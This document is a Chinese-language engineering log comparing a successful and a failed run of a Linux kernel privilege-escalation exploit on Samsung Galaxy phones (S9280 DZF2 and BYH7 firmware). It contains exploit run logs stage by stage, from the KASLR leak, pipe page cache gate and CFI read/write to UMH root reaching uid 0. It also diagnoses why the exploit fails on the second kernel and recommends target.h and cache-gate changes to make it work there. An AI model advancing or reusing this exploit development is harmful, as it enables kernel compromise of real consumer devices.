# 运行日志分析：S9280 DZF2 成功 vs OneUI7 BYH7 失败

> 分析日期：2026-08-22
> 原始日志：`07_发布物/run_logs/`（S9280_DZF2_success.txt / BYH7_e1q_fail.txt）
> 结论先行：S9280 DZF2 全链路验证通过（attempt 2/30 成功）；BYH7 失败点在 **pipe 页内 `anon_pipe_buf_ops` 特征匹配（cache gate）**，`pipe_buffer` 结构布局与 DZF2 存在差异，需按 6.1.99 BTF 核对结构体偏移。

---

## 1. S9280 DZF2 成功日志（基线）

设备：SM-S9280 国行，`S9280ZCS6DZF2`，kernel 6.1.145-android14-11-3254743
结果：**attempt 2/30 成功**，完整走到 KernelSU late-load exit=0

### 1.1 成功链路（与 ADAPTATION_GUIDE 阶段地图逐行对应）

```
[+] preload supervisor pid=12953 attempts=30 base_delay=20000 p0_timeout=45 timeout=120
[+] exploit attempt=1/30 pid=18763 delay=50000 p0_offset=scan
    → slide-kaslr-ok source=tracefs slide=000a0000
    → pipe page / mm leak 正常
    → app fops slide attempt=1/1 triggered=0 verified=0   ← 概率性竞态失败（正常）
[-] exploit attempt=1/30 failed status=1

[+] exploit attempt=2/30 pid=29171 delay=50000 p0_offset=0xa0000
    → slide-kaslr-ok source=forced（复用 attempt1 的 KASLR 结果）
    → [*] mm leaked=ffffff8a6b6dc400 object_index=17
    → [*] S928 bank bucket=17 lock=0x52a0 task=0x1000 mode=0
    → [*] sk_buff reclaim sends=16/16 mode=0
    → [*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=9483
    → [*] stage=verifying-kernel-access
    → [*] cfi write ret=35 / cfi read ret=35            ← CFI 验证通过
    → [*] pipe caches normal1k/2k cgroup1k/2k selected=cgroup2k 0xffffff8001cf7100
    → [*] pipe page idx=0 ... cache18=0xffffff8001cf6800 type=ffffffff match=1  ← 特征匹配
    → [*] phys step pipe probe found=1 pipebuf=... idx=90
    → [*] phys step probed read/write done ok=1
    → [*] root direct start uid=2000 fd=3
    → [*] root umh queued wq=... work=... writes=1/1/1/1/1
    → [*] root umh result wake=1 complete=1 retval=0 socket=1   ← ★ root 成功
    → [+] pipe physrw pid=29171 done=1 root=1 rw64=1/1 uid=2000->0
    → [+] stability keeper pid=10314 retaining reclaimed kernel pages
    → [+] exploit completed attempt=2/30
✔ 临时 root 已获得！
ksud late-load: exit=0 → KernelSU 驱动已加载
```

### 1.2 关键结论

1. **首次失败是竞态而非配置错误**：attempt 1 `app fops slide triggered=0` 是概率性竞态失败，KASLR 结果（slide=0xa0000）在 attempt 2 被复用（`source=forced`），这是设计内行为，不是问题。
2. **S9280 的 pipe 页特征**：`cache18=0xffffff8001cf6800`（即 pipe caches 中的 normal2k 地址）、`cache10=dead000000000122`（poison 值）、`type=ffffffff`，`match=1`——这套特征用于在 4K 页内定位 `pipe_buffer` 数组。
3. **mm 泄漏的 bank 定位**：`object_index=17` → `S928 bank bucket=17 lock=0x52a0`，与 `target.h` 的 bank 配置吻合。
4. **root 阶段完整走通**：workqueue 注入（`writes=1/1/1/1/1`）→ UMH 结果 `retval=0 socket=1` → `uid=2000->0`，**没有出现 worklist 竞态 panic**（运行期间自动熄屏生效）。

---

## 2. OneUI7 BYH7 失败日志（对比）

设备：SM-S9210 国行，`S9210ZCU4BYH7`，kernel 6.1.99-android14-11-2370239
结果：attempt 1 竞态失败；attempt 2 走到 CFI 通过，但 **pipe 页 cache gate 失败**，未获 root

### 2.1 失败链路

```
[+] exploit attempt=1/30 pid=15135 p0_offset=scan
    → slide-kaslr-ok source=tracefs slide=00000000
    → app fops slide triggered=0 verified=0   ← 竞态失败（正常）
[-] exploit attempt=1/30 failed

[+] exploit attempt=2/30 pid=24149 p0_offset=0x0
    → slide-kaslr-ok source=forced
    → [*] mm leaked=... object_index=28
    → [-] S928 lock bucket rejected=28 max=27 mode=0   ← 注意：object_index 超界被拒
    → [-] prepare_kernel_page retry 1/2
    → [*] mm leaked=... object_index=5 → S928 bank bucket=5 lock=0x22a0
    → [*] kernel page prepare attempt=2/2 elapsed_ms=6373
    → [*] stage=verifying-kernel-access
    → [*] cfi write ret=35 / cfi read ret=35          ← CFI 通过（与 DZF2 相同）
    → [*] pipe caches ... selected=0xffffff8001cf7100
    → [*] pipe page idx=0..7 cache08/cache18 均非预期，type=ffffff7f/ffffffff match=0
    → [-] phys step cache gate failed slab=0000000000000000 want=0xffffff8001cf7100
    → [*] app fops slide attempt=1/1 triggered=1 verified=0 step=8
[-] exploit attempt=2/30 failed status=1
```

### 2.2 失败根因定位

**失败点在 pipe 页内 `pipe_buffer` 特征匹配，不在 CFI/root 阶段**：

| 检查点 | S9280 (6.1.145) | BYH7 (6.1.99) | 结论 |
|---|---|---|---|
| KASLR slide | 0xa0000 | 0x0 | 正常（0 合法） |
| CFI write/read | ret=35 | ret=35 | **两者一致** |
| pipe caches selected | cgroup2k 0xffffff8001cf7100 | 同 | 一致 |
| pipe page idx=0 cache18 | 0xffffff8001cf6800 (=normal2k) | 0x0 | **BYH7 不匹配** |
| pipe page idx=0 cache10 | dead000000000122 (poison) | fffffffe... 垃圾值 | **BYH7 偏移读错** |
| pipe page idx=0 type | ffffffff (match=1) | ffffffff (match=0) | **BYH7 页内扫描 8 个 idx 全不匹配** |

**核心判断**：BYH7 的 `pipe_buffer` 结构体在页内的**字段偏移/数组步长与 DZF2 不同**（6.1.99 vs 6.1.145），exploit 用 DZF2 的布局去读 BYH7 的 pipe 页，把无关内存当成 `cache18`/`cache10` 读取，导致特征匹配失败。这与 `byh7-target-complete.md` 第 5 节预判一致（"结构体布局在 6.1.99 vs 6.1.145 间可能有差异；若真机跑不到对应阶段，优先核对 BTF 布局"）。

**次要点**：attempt 2 第一次 `mm leaked object_index=28` 超界（`max=27`）被拒，说明 BYH7 的 mm 分配布局与 DZF2 略有差异（可能只是该次分配偶然落到更高阶 slab），重试后 `object_index=5` 正常。这是软性差异，重试可绕过。

### 2.3 根因修正（2026-08-22，对照 SM-S9380 移植经验）

**更精确的定位：`struct page` 字段偏移错误（vmemmap 地址特征），而非笼统的 pipe_buffer 布局。**

SM-S9380 经验（`03_参考研究/SM-S9380_RMG_root_experience.md` §六）给出 FOPS cache gate 失败判据：

> 失败典型 2：`cache08=fffffffe24997a08` —— 读到 **vmemmap 地址**，即 struct page 偏移算错。

对照 BYH7 失败日志：

```
[*] pipe page idx=0 page=ffffff889bb38000 head=fffffffe226ece00
    cache08=fffffffe208aac08 cache10=fffffffe2919de08 cache18=0 cache20=0 type=ffffff7f match=0
```

- `cache08=fffffffe208aac08`、`cache10=fffffffe2919de08` 均以 **`fffffffe` 开头 = vmemmap 区域地址** → struct page 字段偏移读错（把 vmemmap 内容当成 slab_cache 指针）
- S9280 成功对照：`cache08=0000000000000000`、`cache18=ffffff8001cf6800`（正常内核地址）→ 偏移正确

**需核对的四项偏移**（源自 SM-S9380 ZG1 移植结论，BYH7/6.1.99 需单独确认）：

```
STRUCT_PAGE_SIZE              = 0x40
STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08
STRUCT_SLAB_CACHE_OFF         = 0x18
STRUCT_PAGE_TYPE_OFF          = 0x30
```

> **注意（2026-08-22 反汇编验证）**：上述偏移中 `STRUCT_SLAB_CACHE_OFF` 已通过反汇编确认 **BYH7 与 DZF2 一致（均为 0x18，非 SM-S9380 ZG1 的 0x08）**——两个内核的 `new_slab` 中写 `page->slab_cache` 的指令完全相同（`str x19, [x20, #0x18]`），且 `new_slab`/`__slab_free` 访问 struct page 的偏移集合几乎一致。SM-S9380 是不同平台（pa3q）不同内核版本，其偏移不能直接套用 BYH7。

### 2.4 根因再修正（2026-08-22 反汇编验证后）

**BYH7 失败不是 struct page 偏移错误，而是 pipe 页回收状态问题：pipe 页不在 SLUB slab 缓存中。**

反汇编证据：DZF2 与 BYH7 的 `new_slab` 写 `page->slab_cache` 指令一致（`str x19, [x20, #0x18]`），struct page 布局相同。

日志证据（关键）：
- **BYH7 失败**：`cache08=fffffffe208aac08 cache10=fffffffe2919de08 cache18=0 type=ffffff7f match=0`
  - `cache08/cache10` 以 `fffffffe` 开头 = **vmemmap 区域地址**（struct page 数组在 vmemmap）→ 这是 **buddy 空闲链表指针**（free_list 上相邻页的 struct page 地址）的特征
  - `cache18=0` = 该页 **slab_cache 字段为空** → 页已释放回 buddy 系统，**不在任何 kmalloc 缓存中**
- **S9280 成功**：`cache08=0 cache10=dead000000000122 cache18=ffffff8001cf6800 type=ffffffff match=1`
  - `cache10=dead000000000122` = SLUB poison 值（CONFIG_SLUB_DEBUG 填充）
  - `cache18=normal2k cache 地址` = 页是 SLUB slab 页 ✓

**结论**：BYH7 的 pipe 页被释放后回到了 buddy 空闲链表（或未进入目标 kmalloc-2k 缓存），exploit 在 pipe 页内找不到 slab_cache 匹配 → cache gate 失败。这不是偏移常量错误，而是 **pipe 页回收/分配路径与 DZF2 不同**（可能原因：pipe 容量不同→pipe_buffer 数组落入不同 kmalloc 桶；或回收时序/分配器行为差异；或 cgroup 缓存归属差异）。

**附加观察**：BYH7 attempt2 第一次 `mm leaked object_index=28` 超界（max=27）被拒后重试 `object_index=5` 成功——6.1.99 的 mm 分配布局与 6.1.145 有细微差异（slab 桶位不同），但非致命（重试可绕过）。

**下一步验证方向**（按优先级）：
1. 核对 BYH7 的 `pipe_buffer` 数组实际落桶：`pipe-buffer-max` 等配置或 pipe 默认容量（`PIPE_DEF_BUFFERS`）是否不同 → pipe_buffer 数组大小（32×64B=2KB）是否仍落 kmalloc-2k
2. 检查 BYH7 是否启用 `CONFIG_SLUB_DEBUG`/poison（日志显示 S9280 有 poison 值，BYH7 的页无）→ 回收/分配路径差异
3. 对比两内核 `alloc_pipe_info`（pipe 初始化）中 `kcalloc(pipe_bufs, sizeof(struct pipe_buffer))` 的实际分配尺寸

> **已反汇编验证过的结论**（2026-08-22）：
> - `STRUCT_SLAB_CACHE_OFF=0x18` 在两个内核中一致（`new_slab` 写 `page->slab_cache` 的指令 `str x19, [x20, #0x18]` 相同）
> - `new_slab`/`__slab_free` 访问 struct page 的偏移集合一致，struct page 布局相同
> - `alloc_pipe_info` 中 pipe_buffer 数组分配的指令序列一致（pipe_buffer 大小相同）
> - 两个内核的 kmalloc_caches 地址（normal1k/2k, cgroup1k/2k）完全相同
> - **排除 struct page 偏移和 pipe 分配路径差异**，定位为 pipe 页回收状态问题（页回 buddy 而非 SLUB slab）

**附加因素**：SM-S9380 经验还提示 **Shell 域 vs App 域差异**（cgroup 归属影响 kmalloc 落 cgroup 还是 normal 缓存，与 FOPS 的 kmalloc_cgroup_2k_cache 匹配相关）。BYH7 测试走 App（Shizuku），除偏移外还需考虑运行环境对缓存归属的影响。

---

## 3. 下一步建议

1. **BYH7 排查方向已收敛**（2026-08-22）：通过反汇编验证排除了 struct page 偏移（`0x18` 一致）、pipe 分配路径（`alloc_pipe_info` 一致）、kmalloc_caches（地址一致）三个疑点。**剩余主嫌疑：pipe 页回收状态**——BYH7 的 pipe 页回到了 buddy 空闲链表（cache08/10=vmemmap 链表指针、cache18=0），而 S9280 的 pipe 页是 SLUB slab 页（cache18=normal2k）。
2. **优先实测验证 pipe 回收**：在 BYH7 真机上（或对比 S9280 成功时）观察 `pipe page` 扫描前的 drain/reclaim 是否真正把 pipe_buffer 数组页留在 SLUB。可临时加大 `PIPE_DRAIN/PIPE_RECLAIM` 或调整 `sk_buff reclaim sends` 观察是否改变页状态。
3. **备用方向**：若 pipe 回收状态在 6.1.99 上确实不同（如 CONFIG_SLUB_DEBUG 差异导致 poison 语义不同），考虑在 BYH7 target.h 中调整 `PIPE_DRAIN_SLABS/PIPE_RECLAIM_SLABS` 或 pipe 页扫描逻辑（`pipe_reclaim_cache_gate` 的候选匹配放宽）。
4. **App 域验证**：SM-S9380 经验提示 Shell 域 ≠ App 域（cgroup 归属影响 kmalloc 缓存匹配），BYH7 修正后必须走 App（Shizuku）完整验证。
5. **时序**：保持 `APP_MIN_BOOT_UPTIME_SEC=120`（当前已是），不要改小（SM-S9380 实测 60 秒必失败）。

---

## 4. 复现与验证命令

```sh
# 反查 pipe_buffer 布局（BYH7 ELF）
llvm-nm vmlinux_byh7.elf | grep -E "pipe_buf|anon_pipe_buf_ops"
llvm-objdump -d --start-address=<pipe_fcntl 附近> vmlinux_byh7.elf | grep -A20 "pipe_buffer"

# 设备复测（装 App 后熄屏运行，重启后导出日志）
# 期望日志关键行（成功）：
#   [*] pipe page idx=0 ... match=1
#   [*] root umh result wake=1 complete=1 retval=0 socket=1
```
